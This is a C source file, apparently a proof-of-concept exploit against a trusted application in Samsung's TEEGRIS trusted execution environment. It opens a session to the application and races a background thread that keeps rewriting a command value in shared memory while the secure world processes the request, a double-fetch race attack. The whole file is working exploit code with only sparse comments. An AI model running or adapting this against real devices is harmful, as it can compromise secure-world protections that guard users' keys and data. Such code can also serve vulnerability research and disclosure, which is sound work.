#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "tee_client_api.h"
#include "repro.h"
#include <dlfcn.h>
#include <pthread.h>
#include <stdatomic.h>
#include "tee.h"

static pthread_cond_t cond;
static pthread_mutex_t mutex;
static atomic_bool stop = false;
static bool start = false;


TEEC_Result (*TEEC_OpenSession_impl)(TEEC_Context*,
			     TEEC_Session*,
			     const TEEC_UUID*,
			     uint32_t,
			     const void*,
			     TEEC_Operation*,
			     uint32_t*);
TEEC_Result (*TEEC_InitializeContext_impl)(const char*, TEEC_Context*);
void (*TEEC_FinalizeContext_impl)(TEEC_Context*);
void (*TEEC_CloseSession_impl)(TEEC_Session*);
TEEC_Result (*TEEC_InvokeCommand_impl)(TEEC_Session*,uint32_t,TEEC_Operation*,uint32_t*);
TEEC_Result (*TEEC_RegisterSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);

void cleanup_shm(){
#if EMULATE
	system("ipcrm -M 0x13337");
	system("ipcrm -M 0x13338");
	system("ipcrm -M 0x13339");
	system("ipcrm -M 0x1333a");
#endif
}


uintptr_t get_lib_base(const char *libname) {
    FILE *fp = fopen("/proc/self/maps", "r");
    if (!fp) {
        perror("fopen");
        return 0;
    }
    char line[512];
    while (fgets(line, sizeof(line), fp)) {
        if (strstr(line, libname)) {
            uintptr_t base = 0;
            if (sscanf(line, "%lx-%*lx", &base) == 1) {
                fclose(fp);
                return base;
            }
        }
    }
    fclose(fp);
    return 0;
}

// void init(TEEC_Context *context, TEEC_Session *session, void* mem_area1)
// {
// 	int* ints = (int*) mem_area1;
// 	ints[0] = 0x1007;
// 	ints[1] = 0x33f;

// 	TEEC_Operation op;
//     memset(&op, 0, sizeof(op));
//     op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INOUT, TEEC_VALUE_INOUT,
//                                      TEEC_NONE, TEEC_NONE);
//     printf("params: 0x%lx\n", op.paramTypes);
//     op.params[0].tmpref.buffer = mem_area1;  // the keyblock buffer
//     op.params[0].tmpref.size = 0x1000;  // the keyblock buffer
//     uint32_t err_origin;

//     TEEC_Result res = TEEC_InvokeCommand_impl(session, 0x1, &op, &err_origin);
// 	printf("TEEC_Result: %x origin: err_origin: %x\n", res, err_origin);

// }


void * change_value(void * arg) {
    int* comm_in_params = (int*) arg;
    printf("waiting for signal\n");
    pthread_mutex_lock(&mutex);

    while(!start) {
        pthread_cond_wait(&cond, &mutex);
    }
    pthread_mutex_unlock(&mutex);

    while(!stop) {
        comm_in_params[0] = 0x1006;
        // TODO: maybe sleep for a while and try to extend the race window
        // printf("changed value from 0x1006 to 0x1007\n");
        comm_in_params[0] = 0x1008;
        // printf("changed value from 0x1007 to 0x1006\n");
    }
    return NULL;
}

pthread_t create_thread_for_racing(void* mem_area1) {
    pthread_t tid;
    if (pthread_create(&tid, NULL, change_value, mem_area1) != 0) {
        perror("pthread_create failed");
        exit(-1);
    }
    return tid;
}

void send_req(TEEC_Context *context, TEEC_Session *session)
{
	void* mem_area1 = allocate_param_mem(context, 0x1000);
    memset(mem_area1, 0, 0x1000);

    int* ints = (int*) mem_area1;
	char* chars = (char*)mem_area1;
	ints[0] = 0x1008;
	ints[1] = 0x0;
	chars[0x10] = 0x0;

    TEEC_Operation op;
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INOUT, TEEC_NONE,
                                     TEEC_NONE, TEEC_NONE);
    printf("params: 0x%lx\n", op.paramTypes);
    op.params[0].tmpref.buffer = mem_area1;  // the keyblock buffer
    op.params[0].tmpref.size = 0x1000;  // the keyblock buffer

    pthread_cond_init(&cond, NULL);
    pthread_mutex_init(&mutex, NULL);

#if EMULATE

    // init(context, session, mem_area1);

    pthread_t tid = create_thread_for_racing(mem_area1);
    uint32_t err_origin;

    pthread_mutex_lock(&mutex);
    start = true;
    pthread_cond_signal(&cond);
    pthread_mutex_unlock(&mutex);

    TEEC_Result res = TEEC_InvokeCommand_impl(session, 0x1, &op, &err_origin);
	printf("TEEC_Result: %x origin: err_origin: %x\n", res, err_origin);
    atomic_store(&stop, true);
    pthread_join(tid, NULL);

#else
    // 1. Create shared memory between non-secure and secure
    TEEC_SharedMemory shm = {0};
    shm.size = 0x1000;
    shm.buffer = mem_area1;
    shm.flags = TEEC_MEM_INPUT; // | TEEC_MEM_OUTPUT; 

    TEEC_Result res2 = TEEC_RegisterSharedMemory_impl(context, &shm);
    printf("TEEC_RegisterSharedMemory result: %x \n", res2);

    pthread_t tid = create_thread_for_racing(mem_area1);
    uint32_t err_origin;

    pthread_mutex_lock(&mutex); 
    start = true;
    pthread_cond_signal(&cond);
    pthread_mutex_unlock(&mutex);



    TEEC_Result res = TEEC_InvokeCommand_impl(session, 0x1, &op, &err_origin);

    printf("TEEC_Result: %x origin: err_origin: %x\n", res, err_origin);
    atomic_store(&stop, true);
    pthread_join(tid, NULL);

#endif
    printf("shared mem: %x, %x, %x, %x, %x\n", ints[0], ints[1], ints[2], ints[3], ints[4]);
    printf("Finished...\n");
}

int main(int argc, char **argv)
{
    char* ta = "9459b61a-02d3-4d1e-b68be94397e7ca8c";
    TEEC_UUID *uuid = teegris_uuid(ta);
    printf("TA uuid: %lx %lx %lx %lx %lx %lx %lx %lx\n", uuid->timeLow, uuid->timeMid, uuid->timeHiAndVersion, uuid->clockSeqAndNode[0], uuid->clockSeqAndNode[1], uuid->clockSeqAndNode[2], uuid->clockSeqAndNode[3], uuid->clockSeqAndNode[4], uuid->clockSeqAndNode[5], uuid->clockSeqAndNode[6], uuid->clockSeqAndNode[7]);

    uint32_t err_origin;
    TEEC_Result res;
	TEEC_Context context;
    TEEC_Session session;

	cleanup_shm();
    load_functions();

    // Initialize context
    res = TEEC_InitializeContext_impl(NULL, &context);
    if (res != TEEC_SUCCESS) {
        printf("TEEC_InitializeContext failed with code 0x%x\n", res);
        exit(-1);
    }
    // Open session to trusted application
    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC,
                           NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS) {
        printf("TEEC_OpenSession failed with code 0x%x origin 0x%x\n",
               res, err_origin);
        TEEC_FinalizeContext_impl(&context);
        exit(-1);
    }
    printf("[+] Session opened; error origin: %x\n", err_origin);

    // write banner
    printf("[+] init...\n");
    send_req(&context, &session);
    printf("[+] done...\n");
    TEEC_CloseSession_impl(&session);
    TEEC_FinalizeContext_impl(&context);
    return 0;
}
